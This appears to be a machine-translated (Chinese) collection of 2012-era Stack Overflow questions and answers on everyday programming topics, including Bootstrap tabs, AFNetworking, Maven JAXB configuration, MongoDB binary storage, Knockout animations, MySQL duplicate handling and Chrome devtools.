**编辑：**我制作了一个 IF 函数，它只使第一个函数处于活动状态。截至目前，选项卡可以切换，但内容不会切换。仅显示第一个内容，即使我单击另一个选项卡也不会更改。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:56:05.297

你有标记，但没有`active`类的逻辑。Bootstrap 通过 Javascript 提供该逻辑。

```
$('#myTab a').click(function (e) {
    e.preventDefault();
    $(this).tab('show');
}) 
```

来源：http: [//twitter.github.com/bootstrap/javascript.html#tabs](http://twitter.github.com/bootstrap/javascript.html#tabs)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:26:07.383

我在 cakePHP 中做过类似的事情。您需要指定其中之一，`active`以便用户在加载页面时看到活动选项卡。然后，当他们单击不同的选项卡时，js 会启动并将`active`类移动到该选项卡。您可以放入一个`if`语句，让它只将`active`类添加到第一个选项卡（或默认情况下您想要激活的任何选项卡）。

# objective-c - AFNetworking 设置 runLoopModes？

> ID：12213396
> 
> 赞同：0
> 
> 时间：2012-08-31T10:20:56.847
> 
> 标签：objective-c, afnetworking

AFNetworking 默认的 runLoopModes 是 NSRunLoopCommonModes。我想使用 NSDefaultRunLoopMode，并设置它

```
 operation.runLoopModes = [NSSet setWithObject:NSDefaultRunLoopMode]; 
```

但它不起作用。当我滚动滚动视图时，下载任务仍在运行。任何人都可以帮助我吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-03T12:38:04.463

所以我们开始了，替代解决方案，没有硬编码注入。假设您正在使用 UIImageView+AFNetworking 扩展：

```
// user began scrolling
- (void)scrollViewWillBeginDragging:(UIScrollView *)scrollView {
    [[UIImageView af_sharedImageRequestOperationQueue] setSuspended:YES];
}

// user released finger and scrolling animation is finished
- (void)scrollViewDidEndDecelerating:(UIScrollView *)scrollView {
    [[UIImageView af_sharedImageRequestOperationQueue] setSuspended:NO];
} 
```

另请查看 Foursquare 的[解决方案](https://github.com/foursquare/fully-loaded/blob/master/Classes/FullyLoaded.m)，它依赖于相同的技术。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-02T20:55:58.287

最近我在 UITableView 中实现图像延迟加载时遇到了类似的问题。用户滚动在这里应该有更高的优先级。

您的方向是正确的，问题在于运行循环模式。使用 UIImageView+AFNetworking 扩展，图像使用 AFURLConnectionOperation 加载，它在单独的网络线程上工作（参见实现），因此 NSURLConnections 不在主线程上运行。

要在 UITrackingRunLoopMode 处于活动状态时停止任务，您需要以某种方式**在主线程上移动网络代码。**

可能的解决方案：

1.  为您的请求操作设置默认运行循环模式。

    ```
    AFImageRequestOperation *requestOperation = [[AFImageRequestOperation alloc] initWithRequest:urlRequest];
    [requestOperation setRunLoopModes:[NSSet setWithObject:NSDefaultRunLoopMode]]; 
    ```

2.  将连接放在主线程上（没关系，NSURLConnections 正在运行自己的线程）：查找`+ (NSThread *)networkRequestThread`并使其返回`[NSThread mainThread]`。这可能不适合其他情况，小心锁。

我仍然不确定 AFNetworking 为什么要创建它的单独网络线程。在后台处理传入的数据？如果有人猜到了，请回复。

另请参阅[此](https://stackoverflow.com/questions/5841880/async-nsurlconnection-concurrent-nsoperation-when-to-use-nsrunloop)问题。

# java - java序列化算法

> ID：12213400
> 
> 赞同：0
> 
> 时间：2012-08-31T10:21:13.157
> 
> 标签：java, algorithm, serialization

我试图在谷歌周围找到一些关于 java 序列化算法的好的文档，有谁知道我在哪里可以找到更详细的信息？

谢谢 ;）

我问的原因是因为我想尝试从序列化的二进制 javaobject 在 php 中制作反序列化器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T18:00:40.537

在 JRE 之外解析 Java 序列化流实际上是不可能的。有些类有点调皮，错过了`defaultWriteObject`在他们的自定义`writeObject`方法中调用，这使得流无法解析。之后的数据`defautlWriteObject`是自定义的，因此在不知道所涉及类的具体细节的情况下实际上是不可解析的。可能您最好的方法是启动一个 JRE（或者首先不使用 Java 序列化存储数据）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:25:37.540

对于算法本身，请查看 Java 源代码。

Java 序列化协议（格式）、API 和行为规范都可以从[Java 对象序列化](http://docs.oracle.com/javase/7/docs/technotes/guides/serialization/index.html)技术指南中获得。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-22T18:37:19.143

你必须看到对象序列化流协议，并理解以下[概念](https://www.youtube.com/watch?v=nJrbbmySI70)，

```
Stream Elements
Stream Protocol Versions
Grammar for the Stream Format
Rules of the Grammar 
```

在此之前，您必须了解 TLV（类型长度值编码）如何读取十六进制值

# android - 在 listView 中阻止复选框

> ID：12213401
> 
> 赞同：-2
> 
> 时间：2012-08-31T10:21:14.057
> 
> 标签：android, listview, checkbox, listviewitem

我有一个 listView ( `android.R.layout.simple_list_item_multiple_choice`)，其中每行列表都有一个复选框。

单击一个按钮时，我需要阻止所有复选框。但我不知道如何同时阻止所有复选框。

```
if(checkAll.isChecked()==true){
            all.clear();
            //É adicionado cada id ao array list
            for(int i=0 ; i<listViewSocios.getCount() ; i++){
                listViewSocios.setItemChecked(i, true);

            }
        } 
```

每行中的所有复选框都被选中，但我也想启用所有这个复选框你能帮帮我吗？谢谢

* * *

我尝试这种方式，但不工作....

```
 for(int i=0 ; i<listViewSocios.getCount() ; i++){
                listViewSocios.setItemChecked(i, true);
                CheckBox cb = (CheckBox)listViewSocios.getChildAt(i).findViewById(android.R.id.text1);
                cb.setEnabled(false); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:28:21.627

通过此代码禁用您的复选框单击事件

```
theCheckBox.setClickable(false); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:51:05.353

我解决了这个问题......

```
for(int i=0 ; i<listViewSocios.getCount() ; i++){
    listViewSocios.setItemChecked(i, true);
    CheckedTextView cb = (CheckedTextView)listViewSocios.getChildAt(i).findViewById(android.R.id.text1);
    cb.setEnabled(false);
 } 
```

我不记得 listView 的每个孩子是如何通过的。但我想起来了。XD

谢谢你的时间.... ：）

# html - divs对齐

> ID：12213402
> 
> 赞同：0
> 
> 时间：2012-08-31T10:21:14.757
> 
> 标签：html, css

我正在尝试将这些 div 彼此对齐，但只有前两个 div 对齐。任何人都知道我必须做什么？

```
 <div id="user-tweets" style="float:left; width:25%; border:solid #FCF 1px; height:300px;"></div>
  <div id="map_canvas" style="float:left; width:45%; border:solid #FCF 1px; height:400px"></div>
  <div id="news-tweets" style"float:left; width:20%; border:solid #0056A3 5px; height:500px;"></div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T10:23:12.283

看起来你错过`=`了第三项。

[http://jsfiddle.net/dP9uK/](http://jsfiddle.net/dP9uK/)

```
<div id="user-tweets" style="float:left; width:25%; border:solid #FCF 1px; height:300px;"></div>
<div id="map_canvas" style="float:left; width:45%; border:solid #FCF 1px; height:400px"></div>
<div id="news-tweets" style="float:left; width:20%; border:solid #0056A3 5px; height:500px;"></div>​ 
```

# java - Maven JAXB 插件只执行一次执行

> ID：12213403
> 
> 赞同：7
> 
> 时间：2012-08-31T10:21:25.023
> 
> 标签：java, maven, jaxb, maven-3, maven-jaxb2-plugin

我正在尝试从两个`XSD`模式生成源。我的`JAXB`Maven 插件如下所示：

```
<plugin>
    <groupId>com.sun.tools.xjc.maven2</groupId>
    <artifactId>maven-jaxb-plugin</artifactId>
    <version>1.1.1</version>
    <executions>
        <execution>
            <id>GenerateKenexa</id>
            <goals>
                <goal>generate</goal>
            </goals>
            <configuration>
                <includeBindings>
                    <includeBinding>**/jaxb-bindings-kenexa.xml</includeBinding>
                </includeBindings>
                <includeSchemas>
                    <includeSchema>**/KenexaXMLConfiguration.xsd</includeSchema>
                </includeSchemas>
            </configuration>
        </execution>
        <execution>
            <id>GenerateTalentQ</id>
            <goals>
                <goal>generate</goal>
            </goals>
            <configuration>
                <includeBindings>
                    <includeBinding>**/jaxb-bindings-talentq.xml</includeBinding>
                </includeBindings>
                <includeSchemas>
                    <includeSchema>**/TalentQXMLConfiguration.xsd</includeSchema>
                </includeSchemas>
            </configuration>
        </execution>
    </executions>
</plugin> 
```

第一个生成得很好。但第二个没有。我在 Maven 输出中看到：

```
[INFO] --- maven-jaxb-plugin:1.1.1:generate (GenerateKenexa) @ online.tests.management ---
[INFO] Compiling file:/D:/Projects/GTIWebApplications/gti_online_tests_management/src/main/resources/xsd/KenexaXMLConfiguration.xsd
[INFO] Writing output to D:\Projects\GTIWebApplications\gti_online_tests_management\target\generated-sources\xjc
[INFO] 
[INFO] --- maven-jaxb-plugin:1.1.1:generate (GenerateTalentQ) @ online.tests.management ---
[INFO] files are up to date 
```

它说文件是最新的，但它们甚至没有生成。可能有什么问题？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-19T06:28:38.907

对于像我一样提出这个问题的人，一年后：/

该问题在 maven-jaxb2-plugin 中仍然存在，它可能是 0.8.3 中的某种错误。当您将文件生成到同一目录中时，插件“认为”文件已经生成并跳过第二次执行。

我发现为了生成第二次执行，您必须设置参数

```
<forceRegenerate>true</forceRegenerate> 
```

在配置部分。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-31T11:33:32.583

我解决了这个问题。我已将 maven 插件更改`jaxb`为 maven`jaxb2`插件，现在一切正常。现在我的 Maven 配置如下所示：

```
<plugin>
    <groupId>org.jvnet.jaxb2.maven2</groupId>
    <artifactId>maven-jaxb2-plugin</artifactId>
    <version>0.8.2</version>
    <executions>
        <execution>
            <id>GenerateKenexa</id>
            <goals>
                <goal>generate</goal>
            </goals>
            <configuration>
                <schemaDirectory>src/main/resources/xsd</schemaDirectory>
                <schemaIncludes>
                    <include>KenexaXMLConfiguration.xsd</include>
                </schemaIncludes>
                <generatePackage>com.groupgti.onlinetest.kenexa.jaxb</generatePackage>
                <generateDirectory>${project.build.directory}/generated-sources/kenexa</generateDirectory>
            </configuration>
        </execution>
        <execution>
            <id>GenerateTalentQ</id>
            <goals>
                <goal>generate</goal>
            </goals>
            <configuration>
                <schemaDirectory>src/main/resources/xsd</schemaDirectory>
                <schemaIncludes>
                    <include>TalentQXMLConfiguration.xsd</include>
                </schemaIncludes>
                <generatePackage>com.groupgti.onlinetest.talentq.jaxb</generatePackage>
                <generateDirectory>${project.build.directory}/generated-sources/talentq</generateDirectory>
            </configuration>
        </execution>
    </executions>
</plugin> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-07-30T01:02:31.430

当我到达这里时，我正在使用 jaxb2，但仍然面临问题。我从其他人的答案中将以下部分添加到配置中，现在可以使用。对于以前的答案，成功的部分应该是：

```
<generateDirectory>${project.build.directory}/generated-sources/kenexa</generateDirectory> 
```

还需要一个唯一的执行 ID

```
<id>GenerateKenexa</id> 
```

但是不同的目录使代码位于两个顶级包中，所以最后我正在使用：

```
<forceRegenerate>true</forceRegenerate> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-31T10:34:03.180

首先，我建议为每个 xsd 指定单独的输出文件夹`<outputdirectory>${basedir}/target/generated-sources/xjc</outputdirectory>`

其次，尝试将其设置为单独的插件条目，而不是单独的执行：

```
<plugin>
    <groupId>com.sun.tools.xjc.maven2</groupId>
...
<includeSchema>**/KenexaXMLConfiguration.xsd...
...
</plugin>
<plugin>
    <groupId>com.sun.tools.xjc.maven2</groupId>
...
<includeSchema>**/TalentQXMLConfiguration.xsd...
...
</plugin> 
```

# node.js - mongodb、node.js 和加密数据

> ID：12213404
> 
> 赞同：4
> 
> 时间：2012-08-31T10:21:27.017
> 
> 标签：node.js, mongodb, encryption, aes, bson

我正在从事一个涉及大量加密数据的项目。基本上，这些是序列化为字符串的 JSON 对象，然后使用 AES256 加密为 Cyphertext，然后必须存储在 Mongo 中。我当然可以按照上述方式执行此操作，它将密文作为字符串存储到 BSON 文档中。但是，通过这种方式，如果由于某种原因，密文没有得到正确处理（例如，不同的字符集或其他原因），密文会被更改，我无法再重建原始字符串。有数百万条记录，这是不可接受的（它也很慢）。

是否有适当的方法以某种本机二进制格式保存密文，检索二进制然后将其返回到原始字符串？我习惯于使用字符串，我对二进制格式的技能相当生疏。我很想听听你对这个问题的看法。

谢谢各位的意见，

费边

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T13:34:45.387

是的 ：）

```
var Binary = require('mongodb').Binary;
var doc = {
  data: new Binary(new Buffer(256))
}

or with 1.1.5 of the driver you can do

var doc = {
  data: new Buffer(256)
} 
```

数据始终作为 Binary 对象返回，而不是缓冲区。文档的链接如下。

[http://mongodb.github.com/node-mongodb-native/api-bson-generated/binary.html](http://mongodb.github.com/node-mongodb-native/api-bson-generated/binary.html)

# c# - 使用 Parallel.ForEach 时如何使用 WebBackgrounder

> ID：12213406
> 
> 赞同：0
> 
> 时间：2012-08-31T10:21:40.307
> 
> 标签：c#, .net, task-parallel-library, parallel.foreach

我正在使用任务并行库`Parallel.ForEach()`来执行一些后台任务。我遇到了 Phil Haack 的 WebBackGrounder 应用程序。我想实现它，但只支持`DoWork`方法而不支持动作。关于如何在上下文中使用它的任何想法都将非常有用。否则我应该编写自己的类来处理这些操作。`JobHost``Threading.Task``Parallel.ForEach`

我的并行每种方法如下：

```
IList<object> tasks = FetchActiveTasks();

OrderablePartitioner<Tuple<int, int>> chunkPart = Partitioner.Create(0, tasks.Count(), NoOfPartitions);

Parallel.ForEach(chunkPart, chunkRange =>
{
    for (int i = chunkRange.Item1; i < chunkRange.Item2; i++)
    {
        try
        {
            if (!state.IsExceptional)
            {
                PerformTask(tasks[i]); // Method that carries out actual work.
            }
        }
        catch (Exception e)
        {
            exceptions.Enqueue(e);
        }                  
    }
}); 
```

# python - 如何生成分页数字？

> ID：12213408
> 
> 赞同：0
> 
> 时间：2012-08-31T10:21:51.390
> 
> 标签：python

我做了一个函数，它返回显示的分页数字。我想得到这样的东西（括号是唯一显示活动站点的地方）：

如果页面 < 10

```
1 2 3 4 5 6 7 8 9 10 
```

如果页面 > 10

```
1 2 3 ... 20 [30] 40 ... 78 79 80 
```

其中 [30] 是活动页面。如果活动页面 < 3

```
1 2 [3] 4 ... 20 30 40 ... 78 79 80 
```

等我的代码：

```
 count_all - number of all items
    items_on_page - items displayed on one page
    page - current page

    countpages = int(float(count_all+(items_on_page-1))/float(items_on_page))
    linkitems = 10

    if countpages > (linkitems-1):
        countpagesstr = list()
        for i in range(1,int(float(linkitems+(2))/float(3))):
            countpagesstr += [str(i)]

        countpagesstr += ['...']
        sr = int(countpages/2)
        for i in range(sr-1, sr+1):
            countpagesstr += [str(i)]

        countpagesstr += ['...']
        for i in range(countpages-3, countpages):
            countpagesstr += [str(i)]
    else:
        cp = list()
        for c in range(1,countpages+1):
            cp.append(str(c))
        countpagesstr = cp

    return countpagesstr 
```

如何做得更好？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:35:46.690

好吧，您在那里所做的与以下内容相同：

```
[str(i) for i in range((linkitems + 2) / 3)] + [' ... ', str(active_page - 1), '[' + str(active_page) + ']', str(active_page + 1), '...'] + [str(i) for i in range(cntitems-3, cntitems)] 
```

# asp.net - 登录凭据与转到 url

> ID：12213410
> 
> 赞同：0
> 
> 时间：2012-08-31T10:22:14.587
> 
> 标签：asp.net, reporting-services

我创建了一份关于 SSRS 的报告。我通过在报告中使用 go to url 创建了一个操作。该操作通过 url 调用另一个报告。但需要报告服务器登录凭据。我可以在 url 中传递登录凭据以调用 Microsoft Reporting Server 上的报告吗？

PS：我不能使用 go 来报告，因为我想在新窗口中打开报告。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T15:11:25.923

这是之前在msdn上回答的，

[http://social.msdn.microsoft.com/Forums/en-US/sqlreportingservices/thread/569708ca-46a9-4b27-9fd0-f5ba929c2c9c/](http://social.msdn.microsoft.com/Forums/en-US/sqlreportingservices/thread/569708ca-46a9-4b27-9fd0-f5ba929c2c9c/)

希望能帮助到你。

# javascript - 如何在knockoutjs中为if主体设置动画？

> ID：12213415
> 
> 赞同：0
> 
> 时间：2012-08-31T10:22:44.447
> 
> 标签：javascript, knockout.js, javascript-framework

我有一个名为“state”的 knockoutjs 可观察变量，我正在使用该变量隐藏和显示淘汰赛中的内容，if 条件如下：

```
<--if: state()=="login" -->
login content
<--/if-->

<--if: state()=="registration" -->
registration content
<--/if--> 
```

每当状态变量发生变化时，它都会显示或隐藏内容。所以我的问题是我想在它隐藏或显示时添加切换行为的动画。我怎么能做到呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T11:32:47.683

我为你做了一个快速的小提琴。

[http://jsfiddle.net/ujSvb/1/](http://jsfiddle.net/ujSvb/1/)

一个更动态的例子

[http://jsfiddle.net/ujSvb/2/](http://jsfiddle.net/ujSvb/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T15:10:06.727

我进一步更新了安德斯的小提琴以添加状态条件：

[http://jsfiddle.net/ujSvb/3/](http://jsfiddle.net/ujSvb/3/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T15:03:06.390

首先，我认为您的代码中可能有一些错误（可能只是将其复制错误），但应该是：

```
<-- ko if: state()=="login" -->
login content
<--/ko-->

<-- ko if: state()=="registration" -->
registration content
<--/ko--> 
```

其次，如果您可以将 jQuery 与元素绑定一起使用，而不是使用虚拟元素，例如：

```
<div data-bind="if: state()=="login"> 
```

您可以利用 Knockout 的[bindingHandlers](http://knockoutjs.com/documentation/custom-bindings.html)。我创建了一个 ifTransition 绑定，它可以满足您的需求。这是一个使用 bindingHandler 的小提琴和它的一个示例：

[http://jsfiddle.net/Rynan/vtPT8/](http://jsfiddle.net/Rynan/vtPT8/)

## 更新

好的，我更新了我的小提琴以利用虚拟元素，但您仍然必须将登录和注册内容包装在 div 中以获得您正在寻找的过渡效果。与您的评论保持一致，在状态更改为显示这些特定内容所需的任何状态之前，该 div 不会被渲染，因此在不处于正确状态时不会占用太多内存。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-11T23:19:32.783

投票最多的答案不是解决方案，因为它不会取消渲染元素。

奥斯汀的答案似乎根本不起作用。

请参阅我的回复： [“with”绑定更新之前的动画](https://stackoverflow.com/questions/11558349/animation-before-with-binding-update/21734548#21734548)

对于我发现的一个干净的解决方法，用大致等效的“模板”绑定替换“if”和“with”。

# xml - 休息：Json 不返回 Xml 包含的所有内容

> ID：12213418
> 
> 赞同：0
> 
> 时间：2012-08-31T10:23:01.747
> 
> 标签：xml, json, spring, rest

我编写了一个有效的网络服务休息。

我实现了各种方法，它们以 JSON 格式返回一些信息，但一种方法以 XML 格式返回信息。我补充说：

```
produces="application/json" 
```

在该方法的@RequestMapping 中。现在它返回给我一个 JSON 数据，但它不包含 XML 响应包含的所有信息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T19:43:15.557

尝试使用 @Responsebody 注释，它指示返回类型应直接写入 HTTP 响应正文。如果您需要将对象转换为 JSON，我建议使用 Jackson Json Parser，Spring 不会自动以 JSON 格式生成响应，您需要自己或使用其他框架将响应序列化为 JSON。

弹簧文档：[http ://static.springsource.org/spring/docs/current/spring-framework-reference/html/mvc.html#mvc-ann-responsebody](http://static.springsource.org/spring/docs/current/spring-framework-reference/html/mvc.html#mvc-ann-responsebody)

```
@Controller
@RequestMapping(value = "/pets/{petId}", method = RequestMethod.GET, produces="application/json")
@ResponseBody
public Pet getPet(@PathVariable String petId, Model model) {    
    // implementation omitted
} 
```

# web-services - 从 jsp 调用 Jasper 服务器报告

> ID：12213420
> 
> 赞同：2
> 
> 时间：2012-08-31T10:23:08.567
> 
> 标签：web-services, jsp, jasperserver

我是这个领域的新手，需要帮助。

我正在使用 Jasper 报告服务器。我的目标是从 jsp 调用在 JasperServer 中发布的报告。是否可以？

到目前为止，我能够使用 http api 在 html 页面上显示报告，但问题是用户凭据是明文而不是隐藏的。

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T08:22:26.257

尝试使用JasperServer 的[Rest API](http://community.jaspersoft.com/wiki/getting-started-rest-web-service-api)并使用一些像[Jersey](http://jersey.java.net/)这样的休息客户端来获取您的报告的响应作为输入流并将其呈现在您的 JSP 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T08:34:18.117

我觉得这些对你很有帮助。

[从 JSP 调用 .jasper 文件](http://www.daniweb.com/web-development/jsp/threads/308549/calling-a-.jasper-file-from-a-jsp#)

[使用 JSP 流式传输 PDF Jasper 报告](http://bekwam.blogspot.com/2011/06/streaming-pdf-jasper-report-using-jsp.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-05T12:46:09.763

在阅读了你所有的建议后，我想出了这个解决方案：

```
PutMethod put = new PutMethod(request3);
put.setRequestEntity(new StringRequestEntity(descriptor, "text/xml", "UTF-8"));
int statusCode3 = client.executeMethod(put);
//System.out.println(put.getResponseBodyAsString());
String report = put.getResponseBodyAsString(); 
```

只是我找到了一种方法来设置我的 PUT HTTP 请求的正文，一切正常！我发布了解决方案也许可以帮助某人！

干杯！！

# google-chrome - 如何查看 Chrome 开发者工具网络选项卡中使用的协议？

> ID：12213421
> 
> 赞同：53
> 
> 时间：2012-08-31T10:23:09.513
> 
> 标签：google-chrome, url-scheme, web-inspector

Chrome 开发人员工具栏上的网络选项卡很棒，但我想看看使用什么协议来传输资源（HTTP 或 HTTPS）。任何人都知道我该怎么做，或者是否有扩展允许我做类似的事情。

* * *

## 回答 #1

> 赞同：109
> 
> 时间：2016-06-28T19:27:44.587

好吧，这是 2016 年，现在您可以在 chrome devtools 中有一个协议列。你所要做的就是：

1) 在 devtools 中打开您的**网络选项卡**，然后右键单击任何列标题以打开“选择列”弹出窗口

2）选择**协议**（或任何其他所需的列）以使其出现在面板中

[![在此处输入图像描述](../Images/2b7e07eb8cd0a56b8303bac4d49952cd.png)](https://i.stack.imgur.com/eaRvw.png)

就是这样！

[![在此处输入图像描述](../Images/9c340d7a451362d17bff8c63529a2fdc.png)](https://i.stack.imgur.com/YOPD2.png)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-26T23:29:01.237

单击“名称”列（最左侧）中的资源，然后选择“标题”选项卡。第一行将如下所示：

> 请求 URL：[如何查看 Chrome 开发者工具网络选项卡中使用的协议？](https://stackoverflow.com/questions/12213421/how-can-i-view-the-protocol-used-in-chrome-developer-tools-network-tab)

请求 url 包含协议。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-26T22:37:42.743

您可以通过输入以下内容来使用 JavaScript 控制台：

```
location.protocol 
```

这将返回您使用的网络协议的字符串，例如：

*   “https：”

或者

*   “http：”

# crop - 从 sdcard 裁剪特定图像

> ID：12213427
> 
> 赞同：0
> 
> 时间：2012-08-31T10:23:24.300
> 
> 标签：crop

我想裁剪 sdcard 中存在的图像。我的代码是：

```
Intent intent = new Intent("com.android.camera.action.CROP");

        Uri  uriOfImageToCrop = Uri.parse(Environment.getExternalStorageDirectory()+"/bookpage.jpg");
        intent.setDataAndType(uriOfImageToCrop, "image/*");
        intent.putExtra("outputX", 200);
        intent.putExtra("outputY", 200);
        intent.putExtra("aspectX", 1);
        intent.putExtra("aspectY", 1);
        intent.putExtra("scale", true);
        intent.putExtra("noFaceDetection", true);
        intent.putExtra(MediaStore.EXTRA_OUTPUT, uriOfImageCrop);
        startActivity(intent); 
```

但它显示以下异常：java.lang.IllegalStateException：目标主机不能为空，或在参数中设置。任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T23:07:08.890

Android 不再包含裁剪 API。您需要创建自己的或导入一个，例如： [https ://github.com/lvillani/android-cropimage](https://github.com/lvillani/android-cropimage)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-24T12:47:45.283

您可以使用[http://code.google.com/p/catalano-framework/](http://code.google.com/p/catalano-framework/)

```
FastBitmap fb = new FastBitmap(bitmap);
int startX = 10;
int startY = 10;
int newWidth = 100;
int newheigth = 100;

Crop crop = new Crop(startX, startY, newWidth, newHeigth);
crop.applyInPlace(fb); 
```

# python - python中的“变量或0”是什么意思？

> ID：12213430
> 
> 赞同：26
> 
> 时间：2012-08-31T10:23:28.050
> 
> 标签：python, variables

python中以下语句的含义是什么：

```
x = variable_1 or 0 
```

`variable_1`是一个对象。上面有什么价值`x`？什么是类型`x`？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-08-31T10:25:36.823

如果`variable_1` 计算结果为`False`，则 x 设置为`0`，否则为`variable_1`

把它想象成

```
if variable_1:
  x = variable_1
else:
  x = 0 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-08-31T10:25:20.717

`x`如果评估为假，`0`则为`variable_1`，否则为`variable_1`

```
>>> 'abc' or 0
'abc'
>>> '' or 0
0
>>> ['a', 'b', 'c'] or 0
['a', 'b', 'c']
>>> [] or 0
0 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-31T10:27:39.427

`x``variable_1`如果它的值不是`None`或将被初始化为`False`

简单的例子：

```
>>> a = None
>>> b = 2
>>> a or 0
0
>>> b or 0
2 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-31T10:30:04.107

```
x = variable_1 or 0 
```

这意味着如果`variable_1`评估为`False`（即它被认为是“空的” - 请参阅魔法方法的文档`__nonzero__`），则`0`分配给`x`.

```
>>> variable_1 = 'foo'
>>> variable_1 or 0
'foo'
>>> variable_1 = ''
>>> variable_1 or 0
0 
```

它相当于“如果 variable_1 设置为任何非空值，则使用其值，否则使用 0”。

类型`x`是或类型`variable_1`（`int`因为 0 是`int`）。

# php - 如何以更有效的方式比较mysql中的现有数据？

> ID：12213432
> 
> 赞同：-8
> 
> 时间：2012-08-31T10:23:45.093
> 
> 标签：php

我编写了一个 PHP 网络蜘蛛来从网站获取新闻标题。
当我得到标题时，我会将它们插入到 mysql 中。
第一次真的很管用。
但是，这些作业将每小时运行一次。
但后来，我不想插入重复的数据。
所以，我每次插入mysql时都需要检查。
但我认为这不是一个好方法。
有更好的想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:28:03.477

你可以做很多事情：

*   将您的表格更改为在标题字段上是唯一的。它不允许重复条目。
*   使表格在标题和日期字段上唯一 - 这将允许重复，但不能在同一天 - 这将有助于您输入具有相同名称的新闻文章（它们可能会出现并且*应该*在那里。
*   首先运行一些 SQL 来查看数据是否已经存在，并且它是，不要插入它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:43:41.273

您可以使用唯一键自动决定哪些文章应归类为重复。

举个例子：

```
CREATE TABLE IF NOT EXISTS news_items(
    id INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
    title VARCHAR(150) NOT NULL,
    create_datetime DATETIME NOT NULL,
    description VARCHAR(255) NOT NULL,
    PRIMARY KEY (id),
    UNIQUE INDEX UK_title_create_datetime (title, create_datetime)
)
ENGINE = INNODB; 
```

该表在标题和 create_datetime 上有一个唯一键。以下插入语句将匹配该键上的项目并忽略它们而不会引发错误或插入重复项。

```
INSERT IGNORE INTO news_items (title, create_datetime, description) VALUES ('My News Item', '2012-08-30 11:35:00', 'Something newsworthy happened'); 
```

您也可以使用以下方法轻松更新所选字段以匹配行`ON DUPLICATE KEY UPDATE`：

```
INSERT INTO news_items (title, create_datetime, description) VALUES ('My News Item', '2012-08-30 11:35:00', 'Something newsworthy happened')
ON DUPLICATE KEY UPDATE
    description = VALUES(description); 
```

查看 MySQL 的[INSERT](http://dev.mysql.com/doc/refman/5.5/en/insert.html)文档和[INSERT ON DUPLICATE KEY UPDATE](http://dev.mysql.com/doc/refman/5.5/en/insert-on-duplicate.html)

# jquery - 向 eric hynds 多选下拉菜单添加工具提示

> ID：12213433
> 
> 赞同：0
> 
> 时间：2012-08-31T10:23:49.150
> 
> 标签：jquery, multi-select, dropdownbox

我正在使用 Eric Hynds 提供的基于 Jquery 的多选下拉菜单。

我想将工具提示添加到选择按钮以及下拉列表中的每个项目。原因 - 我截断了显示和选择列表中的文本，并且工具提示应该显示全文。但我找不到任何关于如何添加它的文档。任何帮助表示赞赏。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:28:17.540

当你使用这个插件时，你的选项将被转换为 li 标签，所以给他们属性标题这个

```
$('li').attr('title','tooltip text'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:52:36.300

谢谢拉胡尔。我没有直接使用 li，但这确实给了我一个想法。该控件在内部将每个 li 项目转换为具有一个复选框和一个带文本的 span。我给那个特定的跨度控制上了一堂课。在截断文本之前，我用文本更新了 title 属性。

```
$(".truncate").each(function(){
  $(this).attr('title', $(this).html());
}); 
```

谢谢你的指点。

# ios - ARC 项目构建正常，归档时出现多个警告

> ID：12213434
> 
> 赞同：0
> 
> 时间：2012-08-31T10:23:52.243
> 
> 标签：ios, xcode4, app-store, automatic-ref-counting, ios5.1

几个月前，我发布了游戏的 1.0 版。然后，我将我的游戏迁移到 ARC 并开发了 1.1 版。

5 月主机运行 Snow Leopard、Xcode 4.2，因此我无法针对 iOS 5.1+ 或新 iPad，我无法将那台 Mac 升级到 Lion 或更高版本，因为我需要一些旧版 PowerPC 软件。

所以我将我的游戏开发转移到另一台 Mac 上，Mountain Lion，最新版本的 Xcode/SDK。构建/运行、分析工作正常（零警告），但是当我尝试“归档”我的发布方案（分发配置文件、发布配置等）以提交到 AppStore 时，我收到以下警告：

`Method possibly missing a [super dealloc] call`

...对于**每个**源文件 (.m)。

看起来该项目正在为 ARC**构建**，但它正在**归档**，好像 ARC 已被禁用。我该如何解决？还是我应该忽略警告并提交二进制文件？

任何反馈，非常感谢...

